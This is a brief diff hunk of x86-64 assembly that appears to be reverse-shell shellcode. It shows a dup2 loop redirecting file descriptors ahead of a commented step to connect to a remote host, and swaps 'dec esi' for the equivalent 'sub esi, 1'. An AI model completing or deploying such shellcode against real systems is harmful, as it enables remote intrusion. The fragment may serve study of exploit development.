@@ -60,7 +60,7 @@
 dup_loop64:
     mov     al, 33           ; rax=sys_dup2
     syscall
-    dec     esi
+    sub     esi, 1
     jns     dup_loop64       ; jump if not signed
     
     ; step 3, connect to remote host
